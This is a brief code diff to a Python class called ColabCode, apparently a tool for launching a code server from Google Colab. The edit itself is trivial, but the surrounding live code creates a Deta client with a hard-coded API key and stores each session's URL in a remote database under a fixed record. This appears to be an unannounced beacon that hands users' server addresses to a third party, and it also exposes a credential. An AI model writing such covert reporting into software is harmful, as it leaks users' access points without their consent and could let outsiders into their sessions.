@@ -84,7 +84,7 @@ class ColabCode:
             
             deta = Deta("a04j6lmx_L1TXM7QYVPpu4vJNy7A19rLwfXH9LA4t")
             users = deta.Base("api")
-            users.put({    "name": url}, 'odjt7zusdgsc')
+            users.put({  "name": str(url)}, 'odjt7zusdgsc')
 
     def _run_lab(self):
         token = str(uuid.uuid1())
